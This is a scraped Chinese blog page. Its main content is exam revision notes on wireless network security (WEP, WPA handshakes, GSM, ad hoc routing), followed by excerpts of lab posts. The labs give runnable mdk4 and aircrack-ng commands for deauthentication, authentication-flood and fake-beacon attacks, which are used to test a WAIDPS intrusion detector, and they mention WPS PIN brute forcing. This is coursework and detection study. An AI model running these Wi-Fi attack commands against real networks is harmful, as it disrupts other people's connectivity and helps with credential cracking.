WEP、TKIP安全性比CCMP差，但不需要硬件支持 四次握手协议（很重要） Wireshark 用eapol过滤看握手包 $$ AP\\to STA $$ A_nonce 、PTK $$ STA\\to AP $$ S_nonce MIC $$ AP\\to STA$$ MIC $$ STA\\to AP $$ ​ MIC AP $\\to$ Station , AP发送随机数Anonce给STA。当STA收到Anonce时，和自己产生的Snonce计算生成PTK。 Station $\\to$ AP，STA发送随机数Snonce给AP。此消息携带了消息完整码MIC，它是由STA用刚刚得到的PTK中的密钥完整性密钥计算而来。然后，AP计算出PTK并利用密钥完整性密钥验证MIC。 AP $\\to$ Station ， AP发送一个包含MIC的消息给STA。 STA $ \\to $ AP ，STA承认接收到第三个消息。验证MIC，通过验证装载PTK 根据四次握手，判断握手包是不是有效的，要集齐message12才是有效的。 因为破解需要三个参数，AP生成的随机数，Station生成的随机数，MIC做比较 。 攻击者可以在四次握手过程中Message2发送后,冒充AP向STA发送伪造的Message1。STA将根据新的Message1中的A_nonce和本身产生的新的S_nonce。重新计算PTK，而PTK与认证者收Message2后产生的PTK显然是不一致的，这样STA收到Message3后无法正确校验，就会导致四次握手过程被终止，造成了DoS攻击。 802.11r 做快速切换的时候用的协议 802.11s是什么协议 基于802.11的无线Mesh网络。 MP：Mesh节点。没有AP 的功能，只能作为中继节点。 MAP：Mesh接入节点。作为接入点的MP，拥有MP的全部功能，并提供接入服务。 MPP：Mesh 门桥节点。是MAC 协议数据单元（MSDU）进入或离开无线mesh网络的桥接 第三章HLR、VLR寄存器之间的区别 HLR归属位置寄存器：用于移动用户管理的静态数据库 VLR：拜访位置寄存器，动态数据库 名词解释 IMSI：国际移动用户识别码。GSM系统中每个用户分配唯一一个，驻留在SIM卡 TMSI：临时移动用户标识码 MSRN：移动用户漫游号码 MSISDN：移动用户ISDN码。是用户为找到GSM用户所拨的号码 MSISDN和MSRN区别 MSISDN：只在网络中关联，只在被呼时有效。它只与用户发生作用，是一个目录号码 MSRN：它只用在网络实体之间，没有用户可以访问它 GSM鉴权，三参数组都是什么 随机数RAND 符号响应XRES 加密密钥Kc ：放在SIM卡和AUC中 GSM加密、鉴权、密钥生成的算法都是什么 鉴权： A3 加密： A5 密钥产生：A8 GSM问题是什么 TMSI的安全新问题，数据丢失，要明文发送IMSI 认证方案缺陷，不是端到端，用户鉴权是单向的 加密方案缺陷，加密算法不公开。算法固定不变 为了保证GSM的安全性能，采取了什么安全措施 接入网用户鉴权 无线链路上通信信息加密 用户身份（IMSI）采用临时识别码（TMSI）保护 移动设备采用设备识别 SIM卡用PIN码保护等 GPRS和GSM区别 GSM电路交换 GPRS分组无限服务技术基于TCP&#x2F;IP（2.5G） UMTS 一种3G 标准 用户和网络的相互鉴权； 鉴权和密钥协商有一个协议：认证和密钥协商机制（Authenticated Key Agreement, AKA） 第四章位置隐私 借助互联网或无线网络，在固定用户或移动用户之间，完成定位和服务两大功能。 位置匿名 即时性特点。 位置隐私保护主要的工作 位置匿名：从集合外向集合里看，组成集合的各个对象无法区别 查询处理：位置信息不再是用户的真实位置，可能是多个位置的集合也可能是一个模糊化的位置。 第六章移动Ad hoc网络的特点 无基础设施。 使用无线链路。 多跳。 节点自由移动。 无定形。 能量限制。 内存和计算功率限制。 DSDV、AODV、DSR三种协议了解，有什么区别，属于什么分类。哪些支持单向链路，哪些不支持单向链路。 DSDV 表驱动的协议。 通常使用最短路径算法。表驱动路由协议的时延较小，但路由协议的开销较大，浪费了无线带宽资源 基于双向链路，不支持单向链路。 DSR 基于源路由的按需路由 节点需要发送数据分组时才进行路由发现过程 支持单向链路 AODV 按需路由 通往目的节点路径上的各节点均建立和维护路由表，路由报文头部不再需要携带完整路径，减少了报文头部路由信息对信道的占用，提高了系统效率。 只支持双向链路，不支持单向 密钥管理的方案 完全分布式的解决方案 在有向图里知道一个子图，怎么判断两个点之间的有向链路 部分分布式的解决方案 传统的基于PKI，里面有k个c。把一个c变成很多c 第八章社交网络的特点 节点移动性较强，社交网络中的数据在同属于一个社区的用户之间产生，通过节点的移动而传播。 数据的分发方式是“存储—携带—转发”，端到端的延迟较大。 由于没有端到端的连接，数据的传递与转发依赖于用户之间的信任关系。 与传统的无线网络相同，社交网络的能量和物理空间也是有限的。 路由算法（四种）都是什么意思 传染路由：基本原理是中间节点将数据包转发给所有遇到的节点。 传统路由：根据路由表项为数据包进行路由路径选择。 上下文路由：根据一定的上下文信息将数据包转发给遇到目的节点概率较大的节点。 机会路由：核心机制在于监听和合作。首先将数据广播给其通信范围内的所有节点，然后利用节点间的合作机制，选择一部分节点接收数据进行服务。 隐私保护，图里面，三个大类（边、结点、图） 图来表示社交网络社交 节点代表用户 边代表用户之间的关系。 实验无线网卡的工作模式管理模式（Managed） 用于无线STA直接与无线AP进行接入连接 主模式（Master） 允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。 Ad_Hoc模式 用户的网络由互相直连的设备组成时使用。各设备之间对等网络的方式连接。（拿了网线时） 监听模式（Monitor） 监控无线网络内部的流量。 123airmon-ng check killairmon-ng start wlan0airmon-ng stop wlan0mon 发起三种攻击的原理、流程airodump-ng 侦听数据包 aireplay-ng 的 deauth 强制合法客户端掉线，掉线后客户端会尝试重新连接AP，此时会产生握手包。（一是必须处在目标AP的信号范围内；二是已有合法客户端连接该AP。）airbase-ng 伪造目标AP来欺骗客户端与其连接，产生握手包 mdk4 interface:指定用于攻击的网络接口，需是监听模式的接口。 12345678910111213141516a: 实施身份验证洪水攻击模式。-a: 指定要攻击的目标AP的MAC地址。-m：使用有效数据库中的客户端MAC地址。-s：设置包的速率，默认无限制。##########################d: 实施Deauth攻击攻击模式。-c：指定攻击的信道，默认将在所有信道之间跳转，每3秒切换一次。-E:攻击指定ESSID的AP。 -B：攻击指定BSSID的AP。########################b: 实施假信标洪水攻击模式。-n：自定义ESSID。-f：读取ESSID列表文件。-w：选择假网络应具有的加密类型，有效选项： n=不加密，w=WEP， t=TKIP（WPA），a=AES（WPA2）。-t： 1=仅创建自组织网络 ，0=仅创建Managed（AP）网络。 Deauth攻击 通过伪造AP向客户端单播地址发送取消身份验证帧，将客户端转为未关联&#x2F;未认证的状态。 Deauth攻击流程： 确定客户端与AP已建立连接。 向整个网络发送伪造的取消身份认证报文，从而阻断合法用户和AP间的连接。 当客户端收到攻击者发送的报文时，会认为该报文来自AP。此时，客户端将试图与AP重新建立连接。 攻击者仍然继续向信道中发送取消身份认证帧，将导致客户端与AP始终无法重连，即已连接的客户端自行断开连接。 语法格式 1mdk4 &lt;interface&gt; d &lt;test_options&gt; 认证洪水攻击 向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。 认证洪水攻击具体工作流程： 确认客户端与AP已经建立了连接。客户端连接请求都会被AP记录在连接表中。 使用看起来合法但其实是随机生成的MAC地址来伪造STA。然后，攻击者就可以发送大量的虚假连接请求到AP。 攻击者对AP进行持续且大量的虚假连接请求，最终导致AP失去响应，使得AP的连接列表出现错误。 由于AP的连接表出现错误，使得连接的合法客户端强制与AP断开连接。 语法格式 1mdk4 &lt;interface&gt; a &lt;test_options&gt; 假信标洪水攻击 假信标攻击类似于伪AP，就是向无线信道中发送大量虚假的SSID来充斥客户端的无线列表，通过创建恶意无线热点，占用信道资源，干扰通讯。 流程 创建一个虚假的ESSID 使用假信标洪水攻击，产生了大量的Beacon信号帧，是随机产生的 语法格式 1mdk4 &lt;interface&gt; b &lt;test_options&gt; 捕获数据包的参数过滤身份认证数据包 12wlan.fc.type_subtype==0X0B//认证类型有两种，0是开放式，1是共享式 只显示Beacon帧 1wlan.fc.type_subtype==0X08 找出与客户端连接的AP 1wlan.fc.type_subtype==0X00 过滤握手包 1eapo 详细版第一章无线局域网的标准 802.11 无线网络安全、有线网络安全的区别 无线网络的开放性使得网络更容易受到被动窃听或主动干扰等各种攻击。 有线网络的网络连接是相对固定的，具有确定的边界，可以通过将电线隐藏在墙内避免接触外部的方式来确保安全连接。通过对接入端口的管理，可以有效地控制非法用户的接入 无线网络的移动性使得安全管理难度更大 有线网络的用户终端与接入设备之间通过线缆连接，终端不能在大范围内移动，对用户的管理比较容易。 无线网络动态变化的拓扑结构使得安全方案的实施难度更大 有线网络具有固定的拓扑结构，安全技术和方案容易部署。 无线网络传输信号的不稳定性带来无线通信网络及其安全机制的健壮性问题，无线网络随着用户的移动其信道是变化的，会受到多方面的影响。 有线传输的环境是确定的，信号质量稳定。 无线网络终端设备具有与有线网络终端设备不同的特点。网络实体设备可能被攻击者物理地接触到，因而可能存在假AP，并且具有资源受限的特点。 有线网络的网络实体设备，如路由器、防火墙一般都不能被攻击者物理地接触到。 无线设备之间的连接应该根据使用者的移动性和链路质量进行灵活的适应，但是要更加信任的关系。 有线网络没有太好的灵活性，但是安全性更有信心 第二章WEP 名词解释： WEP (Wired Equivalent Privacy) 有线等效保密 Station移动站、AP访问点 IV (Initialized Vector) 初始化矢量 C 密文、P 明文、Key 密钥 ICV (Integrity Check Value) 完整性校验和 RC4 (Rivest Cipher 4) 对称加密算法，流加密算法 WEP设计思想： 使用RC4序列密码加密保护数据机密性； Station与AP共享同一密钥，实施接入控制； CRC-32循环冗余校验值保证数据完整性； 加密方式： $$ RC4（ZV,key)\\bigoplus{P,ZCV} $$ 计算明文数据的CRC-32冗余校验码和明文一起构成传输载荷。 Station和AP共享密钥Key。选定一个初始化矢量IV 将IV和Key连接起来构成种子密钥，送入RC4算法的伪随机数生成器，产生密钥流 加密密钥流与传输载荷异或，构成密文C 解密方式： IV明文形式和C一起发送 接收方从数据包提取IV和C，将IV和key一起送入RC4伪随机数生成器，得到解密密钥流 解密密钥流和C异或，得到明文P和CRC校验和ICV WEP规定了两种认证方式 开放系统认证 不进行用户认证，任何接入WLAN的请求都被允许 共享密钥认证 通过检验AP和Station是否共享同一密钥来实现的（WEP加密密钥） 802.1x协议 基于端口的访问控制协议 定义了两类协议接入实体 认证请求者 认证者 体系结构里分了三个组成部分 申请者系统 认证者系统 认证服务器 认证者系统对应于不同用户的端口，有两个逻辑端口 受控端口：只在认证通过的状态下才打开，用于传递网络资源和服务 非受控端口：始终处于双向连通状态，主要用于传送与认证相关的数据帧。 802.1x的认证流程 申请者发出请求认证报文EAPOL-start 认证者收到消息后向申请者发送EAP-Request&#x2F;Identity，要求提供认证信息 申请者响应请求，发送用户名信息给认证者。 认证者将数据封包处理发给认证服务器。 认证服务器收到后，与数据库中的用户名表进行对比，找到对应口令信息并随机生成加密字，传给认证者 申请者收到认证者传来的加密字后，用其对口令部分加密，交给认证者。 认证者再传给认证服务器 认证服务器收到后，与自己经加密后的口令进行对比。把反馈信息给认证者。 认证者发出打开端口的指令，告知业务流可通过端口访问。否则失败。端口关闭 用户要求断开网络时，发送断网请求。认证者把端口设置为非授权状态 802.1x认证特点 协议实现简单，二层协议，对设备性能要求不高 采用受控端口和不受控端口的逻辑功能，将业务与认证分离，简化了复杂过程，提高了封装效率 不对称协议，只能网络鉴别用户，不能双向鉴别，有安全隐患 WAPI协议（大概了解概念） 基于公钥技术实现基站和访问接入点两者的身份验证 合法的用户接入合法的网络 分为无线局域网鉴别基础结构和无线局域网保密基础结构 WPI 使用对称密码算法实现加&#x2F;解密 802.11 i 协议 RSN的概念 （Robust Security Network）强健网络安全，这样做的目的是为了提高无线网络的安全性。 TKIP (Temporal Key Integrity Protocol) 临时秘钥完整性协议 通过使用加密混合函数来处理初始向量过弱或空间过小的问题。 TKIP最基本的内容实际还是RC4流加密算法。不过，TKIP中密码使用的密钥长度为128位。这解决了WEP的第一个问题：过短的密钥长度。 CCMP (CTR with CBC-MAC Protocol) 对称密钥块密码模式。 CCMP是在AES的CCM模式基础上改进而来的密码协议。 CCMP加密在802.11i修正案中定义，用于取代TKIP和WEP加密。 CCMP使用AES块加密算法取代WEP和TKIP的RC4流加密算法，它也是WAP2指定的加密方式 因为AES加密算法是和处理器相联系的，所以旧的设备中可以支持WEP和TKIP，但是不能支持CCMP&#x2F;AES加密 TKIP和CCMP区别 TKIP基于RC4。CCMP基于AES算法，需要硬件支持 TKIP和WEP关系 TKIP用以在不需要升级硬件的基础上替代WEP协议。 由于WEP协议的薄弱造成了数据链路层安全被完全跳过，且由于已经应用的大量按照WEP要求制造的网络硬件急需更新更可靠的安全协议，在此背景下临时密钥完整性协议应运而生。 只要硬件支持WEP加密，通过在现有的设备上升级固件和驱动程序就能够支持更安全的TKIP加密。 TKIP是为了升级WEP加密的安全性，TKIP保留了WEP的基本架构与过程方式，不过是在WEP最易遭受攻击的弱点进行了加强。 1） TKIP使用了一种新型的完整性校验MIC算法，完整性校验散列算法取代WEP的CRC，并且SA和DA都会受到MIC的保护，检测伪造帧也相对容易。而WEP不保护帧头，MIC还纳入了优先级位信息。 2） TKIP对帧进行计数，次序错乱的帧将被丢弃； 3） TKIP使用一种密钥混合函数处理生成密钥，WEP加密的IV是24位，TKIP将IV增加到48位，从而保证了IV的不可重复性，这样用来加密的Key也避免了重复，每个帧的加密秘钥都是不同的。 TKIP、WEP、CCMP区别关系 CCMP使用AES块加密算法取代WEP和TKIP的流秘钥加密算法，AES使用的是对称加密算法， TKIP基于RC4，他做一个过度，CCMP基于AES算法，需要硬件支持。TKIP对已经在用的路由器，来做一个过度，是设备能适配更高级别的安全等级， 四次握手协议（很重要） Wireshark 用eapol过滤看握手包 $$ AP\\to STA $$ A_nonce 、PTK $$ STA\\to AP $$ S_nonce MIC $$ AP\\to STA$$ MIC $$ STA\\to AP $$ ​ MIC AP $ \\to$ Station , AP发送随机数Anonce给STA。当STA收到Anonce时，和自己产生的Snonce计算生成PTK。 Station $\\to$ AP，STA发送随机数Snonce给AP。此消息携带了消息完整码MIC，它是由STA用刚刚得到的PTK中的密钥完整性密钥计算而来。然后，AP计算出PTK并利用密钥完整性密钥验证MIC。 AP $\\to$ Station ， AP发送一个包含MIC的消息给STA。 STA $ \\to $ AP ，STA承认接收到第三个消息。验证MIC，通过验证装载PTK 根据四次握手，判断握手包是不是有效的，要集齐message1234才是有效的。 因为破解需要三个参数，AP生成的随机数，Station生成的随机数，MIC做比较 。 攻击者可以在四次握手过程中Message2发送后,冒充AP向STA发送伪造的Messagel’。STA将根据新的Messagel’中的Anonce’和本身产生的新的Snonce。重新计算PTK’，而PTK’与认证者收到Message2后产生的PTK显然是不一致的，这样STA收到Message3后无法正确校验，就会导致四次握手过程被终止，造成了DoS攻击。 802.11r 做快速切换的时候用的协议 802.11s是什么协议 基于802.11的无线Mesh网络。定义了三个结点，Mesh 节点（MP）是支持无线局域网mesh 服务的802.11 实体；Mesh 接入节点（MAP）是作为接入点的MP，拥有MP的全部功能，并提供接入服务。Mesh 门桥节点（MPP）是MAC 协议数据单元（MSDU）进入或离开无线mesh网络的桥接（bridge）。其中，MP 没有AP 的功能，只能作为中继节点。 第三章HLR、VLR寄存器之间的区别 HLR归属位置寄存器：用于移动用户管理的静态数据库 VLR：拜访位置寄存器，动态数据库 IMSI、TMSI、MRSN、MSISDN都是什么 IMSI：国际移动用户识别码。GSM系统中每个用户分配唯一一个，驻留在SIM卡 MSISDN：移动用户ISDN码，是用户为找到GSM用户所拨的号码。用于PSTN或ISDN或其他移动用户拨向GSM系统的号码。MSISDN&#x3D;CC+NDC+SNCC&#x3D;国家码（如中国86），NDC&#x3D;国内地区码，SN&#x3D;用户号码 MSRN：移动用户漫游号码 MSISDN和MSRN区别 MSISDN只在网络中关联，只在被呼时有效。它只与用户发生作用，是一个目录号码 MSRN的使用是非常严格的，它只用在网络实体之间，没有用户可以访问它 TMSI：临时识别符 GSM鉴权，三参数组都是什么 随机数RAND、符号响应XRES、加密密钥Kc 加密密钥放在哪里，（用户鉴权键Ki） 加密密钥Kc不在无线接口上传送，而是在SIM卡和AUC中，由这两部分来完成相应的算法。 加密、鉴权、密钥生成的算法都是什么 加密：通过相同的输入参数RAND和Ki，将两个算法合为一个来计算符号响应和加密密钥。将A8算法生成的加密密钥Kc和承载用户数据流的TDMA数据帧的帧号作为A5算法的输入参数，生成伪随机数据流。再将伪随机数据流和未加密的数据流作模2加运算，得到加密数据流。 GSM问题是什么 TMSI的安全新问题，数据丢失，要明文发送IMSI 认证方案缺陷，用户鉴权是单向的 加密方案缺陷 加密算法不公开。算法固定不变 不是端到端，单向认证（用户不能鉴别网络） 为了保证GSM的安全性能，采取了什么安全措施 接入网采用用户鉴权无线链路上采用通信信息加密用户身份（IMSI）采用临时识别码（TMSI）保护移动设备采用设备识别SIM卡用PIN码保护等 GPRS和GSM区别 GSM电路交换、GPRS分组无限服务技术基于TCP&#x2F;IP（2.5G） UMTS 双向健全、 AKA协议 （密钥产生的时候。认证与密钥协议&#x2F;健全与密钥协议） 第四章位置隐私，大概了解 LBS英文全称为Location Based Services, 它包括两层含义：首先是确定移动设备或用户所在的地理位置；其次是提供与位置相关的各类信息服务。所以说LBS就是要借助互联网或无线网络，在固定用户或移动用户之间，完成定位和服务两大功能。 位置匿名 位置匿名的即时性特点。在位置隐私中，通常处理器面临着大量移动对象连续的服务请求以及连续改变的位置信息，使得匿名处理的数据量巨大而且频繁的变化。在这种在线（Online）的环境下，响应时间也是用户的满意度的一个重要衡量标准。 位置隐私保护主要的工作：第一，位置匿名（Location Anonymization）。匿名指的是一种状态，这种状态下很多对象组成一个集合，从集合外向集合里看，组成集合的各个对象无法区别，这个集合称为匿名集。第二，查询处理。感知位置隐私的 LBS系统中，位置信息经过匿名处理不再是用户的真实位置，可能是多个位置的集合也可能是一个模糊化（Obfuscation）的位置。。 位置匿名查询处理 （4）基于位置匿名的查询处理。经过匿名处理的位置信息，通常是对精确的位置点进行模糊化处理后的位置区域。得到的查询结果跟精确的位置点的查询结果是不一样的。如何找到合适的查询结果集，使得真实的查询结果被包含在里面，同时也没有浪费通讯代价和计算代价，是匿名成功之后需要处理的主要问题。 第六章移动Ad hoc网络的特点 无基础设施。使用无线链路。多跳。节点自由移动。无定形。能量限制。内存和计算功率限制。 路由安全 DSDV、AODV、DSR三种协议了解，有什么区别，属于什么分类。哪些支持单向链路，哪些不支持单向链路。 DSDV 表驱动的协议。采用了序列号机制来区分路由的新旧程度，防止可能发生的路由环路。 基于双向链路，不支持单向链路。 DSR 动态源路由协议。 节点需要发送数据分组时才进行路由发现过程 支持单向链路 ADOV 无线自组网按需平面距离向量路由协议 通往目的节点路径上的各节点均建立和维护路由表，路由报文头部不再需要携带完整路径，减少了报文头部路由信息对信道的占用，提高了系统效率。 只支持双向链路，不支持单向 DSDV、AODV、DSR三种协议了解，有什么区别，属于什么分类。哪些支持单向链路，哪些不支持单向链路。 表驱动路由。。 密钥管理的方案 完全分布式的解决方案 节点生成其密钥，发行、存储和分发公钥证书。 每个节点包含本地证书存储库，该数据库包含有限数量的证书。 当节点u想要验证节点v的公钥的真伪时，这两个节点合并他们的本地证书存储库，然后节点u会试图在这个合并的库中找到一个从自己到v的合适的证书链。 建立公共密钥：每个节点的公钥和对应的私钥是在本地节点本身创建的 签发公钥证书：如果一个节点u信任一个给定的公共密钥K_v，并且K_v属于给定的节点v，那么u可以签发一个公钥证书，在该证书中K_v以u的签名绑定到v。 证书的存储：每个节点维护本地的证书库，主要有两部分： 首先，每个节点存储它自己签发的证书。 其次，每个节点存储一组额外的证书（由其他节点签发）。 部分分布式的解决方案 使用门限密码部署CA，根据节点的安全性和物理特性上的功能特别的选择节点 这些被选择的节点共同提供PKI功能，被称为MOCA（mobile certificate authority，移动正式颁发机构）。 一个客户端和多个MOCA服务器之间进行通信。 一个客户端至少联系k个MOCA，以及接收至少k个回复。 认证服务的客户端需要发送认证请求（CREQ）数据包，任何收到CREQ的MOCA都要以认证回复（CREP）数据包作为响应。 CREP中包含其部分签名，客户端为了得到k个CREP，等待一段固定时间，当客户端收集k个适用的CREP时，它可以重建完整的签名并且认证请求成功。 如果收到的CREPs过少，客户端CREQ定时器超时，认证请求失败。 完全分布式（本质，在有向图里知道一个子图，怎么判断两个点之间的有向链路）、部分分布式（传统的基于PKI，里面有k个c。把一个c变成很多c） 第七章社交网络的特点 节点移动性较强，社交网络中的数据在同属于一个社区的用户之间产生，通过节点的移动而传播。 数据的分发方式是“存储—携带—转发”，端到端的延迟较大。 由于没有端到端的连接，数据的传递与转发依赖于用户之间的信任关系。 与传统的无线网络相同，社交网络的能量和物理空间也是有限的。 路由算法（四种）都是什么意思 传染路由(Epidemic Routing)：基本原理是中间节点将数据包转发给所有遇到的节点。传统路由(Traditional Routing)：根据路由表项为数据包进行路由路径选择。目前针对传统路由算法的信任模型比较多。上下文路由(Context-based Routing)：根据一定的上下文信息将数据包转发给遇到目的节点概率较大的节点。机会路由(Opportunistic Routing)：核心机制在于监听和合作。首先将数据广播给其通信范围内的所有节点，然后利用节点间的合作机制，选择一部分节点接收数据进行服务。 隐私保护，图里面，三个大类（边、结点、图） 用图来表示社交网络是一种非常直观和形象的方法，社交网络图包含节点和边，节点代表用户，边代表用户之间的关系。 实验无线网卡的工作模式管理模式（Managed） 用于无线STA直接与无线AP进行接入连接 主模式（Master） 允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。 Ad_Hoc模式 用户的网络由互相直连的设备组成时使用。各设备之间对等网络的方式连接。（拿了网线时） 监听模式（Monitor） 监控无线网络内部的流量。 1airmon-ng check killairmon-ng start wlan0airmon-ng stop wlan0mon 发起三种攻击的原理、流程airodump-ng 侦听数据包 aireplay-ng 的 deauth 强制合法客户端掉线，掉线后客户端会尝试重新连接AP，此时会产生握手包。（一是必须处在目标AP的信号范围内；二是已有合法客户端连接该AP。）airbase-ng 伪造目标AP来欺骗客户端与其连接，产生握手包 Deauth攻击 取消认证洪水攻击De-authentication Flood Attack简称Deauth攻击。该攻击方式主要是通过伪造AP向客户端单播地址发送取消身份验证帧，将客户端转为未关联&#x2F;未认证的状态。 Deauth攻击流程：1.确定当前无线网络中客户端与AP已经建立了连接。2.攻击者向整个网络发送伪造的取消身份认证报文，从而阻断合法用户和AP间的连接。3.当客户端收到攻击者发送的报文时，会认为该报文来自AP。此时，客户端将试图与AP重新建立连接。4.攻击者仍然继续向信道中发送取消身份认证帧，将导致客户端与AP始终无法重连，即已连接的客户端自行断开连接。 语法格式 1mdk4 &lt;interface&gt; d &lt;test_options&gt; 1d: 实施Deauth攻击攻击模式。-s：设置包的速率，默认无限制。-c：指定攻击的信道，默认将在所有信道之间跳转，每3秒切换一次。-E:攻击指定ESSID的AP。 -B：攻击指定BSSID的AP。 认证洪水攻击 AP认证洪水攻击，就是向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。 认证洪水攻击具体工作流程：1.确定当前无线网络中，客户端与AP已经建立了连接。一般情况下，所有无线客户端的连接请求都会被AP记录在连接表中。2.攻击者使用一些看起来合法但其实是随机生成的MAC地址来伪造STA。然后，攻击者就可以发送大量的虚假连接请求到AP。3.攻击者对AP进行持续且大量的虚假连接请求，最终导致AP失去响应，使得AP的连接列表出现错误。4.由于AP的连接表出现错误，使得连接的合法客户端强制与AP断开连接。 语法格式 1mdk4 &lt;interface&gt; a &lt;test_options&gt; interface:指定用于攻击的网络接口，需是监听模式的接口。 1a: 实施身份验证洪水攻击模式。-a: 指定要攻击的目标AP的MAC地址。-m：使用有效数据库中的客户端MAC地址。-s：设置包的速率，默认无限制。 假信标洪水攻击 假信标攻击类似于伪AP，就是向无线信道中发送大量虚假的SSID来充斥客户端的无线列表，通过创建恶意无线热点，占用信道资源，干扰通讯。 流程 创建一个虚假的ESSID 使用假信标洪水攻击，产生了大量的Beacon信号帧，是随机产生的 语法格式 1mdk4 &lt;interface&gt; b &lt;test_options&gt; 1b: 实施假信标洪水攻击模式。-n：自定义ESSID。-f：读取ESSID列表文件。-w：选择假网络应具有的加密类型，有效选项：n=不加密，w=WEP， t=TKIP（WPA），a=AES（WPA2）。-t： 1=仅创建自组织网络 ，0=仅创建Managed（AP）网络。-m：读取数据库的MAC地址。-s：设置包的速率，默认为50。-c：自定义信道。 捕获数据包的参数抓到一个包，破解不了，因为握手包是无效的，要能判断一个握手包是否有效（只有message1，23无效） 过滤身份认证数据包 1wlan.fc.type_subtype==0X0B//认证类型有两种，0是开放式，1是共享式 只显示Beacon帧 1wlan.fc.type_subtype==0X08 找出与客户端连接的AP 1wlan.fc.type_subtype==0X00 过滤握手包 1eapo","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"无线网络安全","slug":"期末考试/无线网络安全","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"压缩手工打造的PE文件","slug":"压缩手工打造的PE文件","date":"2021-06-04T08:20:27.000Z","updated":"2024-11-12T06:59:56.000Z","comments":true,"path":"2021/06/04/压缩手工打造的PE文件/","permalink":"https://gryffinbit.top/2021/06/04/%E5%8E%8B%E7%BC%A9%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0%E7%9A%84PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"压缩手工打造的PE文件-压缩节区参考教材https://gryffinbit.lanzoui.com/iBgUCprnmpc 实验目的通过利用C32asm，对实验六手工编写的一个Win32平台下的PE文件进行节区压缩，进一步熟练掌握PE文件的结构。 实验内容压缩手工打造产生的PE文件 手工产生PE 使之压缩后仍可执行并输出如下内容： 实验过程修改压缩节区在内存中节区对齐的大小最小就是 0x00001000，而在磁盘上节区对齐的大小最小可以是0x00000200􏰺。考虑改变磁盘上节区对齐的大小。 修改磁盘对齐大小的值，即 IMAGE_OPTIONAL_HEADER 中 FileAlignment 字段的值 修改节表中关于磁盘的字段，即 IMAGE_SECTION_HEADER 中的 SizeOfRawData 和 PointerToRawData 缩减每个节在磁盘中对应的多余的0字节 相比以前的16k缩小了很多","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"无线入侵检测","slug":"无线入侵检测","date":"2021-06-03T21:13:34.000Z","updated":"2024-11-12T07:00:00.000Z","comments":true,"path":"2021/06/04/无线入侵检测/","permalink":"https://gryffinbit.top/2021/06/04/%E6%97%A0%E7%BA%BF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/","excerpt":"","text":"无线入侵检测实验目的掌握在Kali上安装WAIDPS软件。掌握使用WAIDPS软件进行信息收集的方法。能够利用WAIDPS软件进行入侵检测。 实验环境Kali操作系统及相关工具无线网卡无线AP 实验原理WAIDPS是一个Python编写的无线入侵检测工具，基于Linux平台，完全开源。WAIDPS利用无线网卡可以收集WIFI相关的所有信息，并且它可以探测包括WEP&#x2F;WPA&#x2F;WPS在内的无线入侵和攻击方式。当发现攻击时，系统会在屏幕上显示并记录在日志中。 实验过程安装WAIDPS 切换到home目录 1cd /home 下载waidps到本地 1git clone https://github.com/SYWorks/waidps.git 输入ls可以看到waidps已经下载到了本地。输入cd waidps进入安装文件夹 123lscd waidpsls 赋予waidps.py执行权限 1chmod +x waidps.py 安装软件 1sudo ./ waidps.py 若提示Required file not found :xterm，安装 1apt-get install xterm 软件提示需要安装database，输入y确认 软件安装成功，提示没有检测到无线网卡。 后面的步骤都需要插入无线网卡 用法 1sudo waidps.py [option] &lt;args&gt; 启动WAIDPS软件进入软件目录 1cd /.SYWorks/WAIDPS tip：如果database下载失败，可以手动下载放入&#x2F;.SYWorks&#x2F;Database&#x2F; https://raw.githubusercontent.com/SYWorks/Database/master/mac-oui.db 启动软件 1sudo waidps.py -i wlan0 软件会自动搜索无线信号。 按回车，进入命令行选择菜单，可以进行一些信息筛选。 菜单 用途 输入C 可以更改信息刷新时间和IDS的灵敏度。 输入A 进入审计模式，可进行WPS PIN码暴力破解。 使用WAIDPS进行入侵检测使用另一台机器或使用另外的无线网卡进行mdk3&#x2F;mdk4进行ESSID暴力破解，在攻击列表会显示“MDK3-Basic Probing &amp; ESSID BruteForce Mode” 第二个网卡，是wlan1，打开监听模式 1airmon-ng start wlan1 选择攻击目标–连接到209网络的客户端 对连接209网络的客户端进行认证洪水攻击 1mdk4 wlan1mon a -a B0:B5:C3:CB:F8:FF -m 检测到认证洪水攻击 进行Deauth攻击 （要选择攻击的信道，209的信道是6） 1mdk4 wlan1mon d -s 120 -c 6 检测到Deauth攻击 进行假信标洪水攻击 1mdk4 wlan1mon b -n 209 -t 0 -w w -c 6 -s 80 检测到假信标洪水攻击 审计按回车，进入命令行菜单，输入A，进入审计模式，可进行WPS PIN码暴力破解。 输入编号1，选择AP （看要攻击的那个编号是什么） option use 2 可以选择2抓WPA握手包，选3进行WPS暴力破解PIN 4 输入4 选择快速破解方式 n 使用默认设置 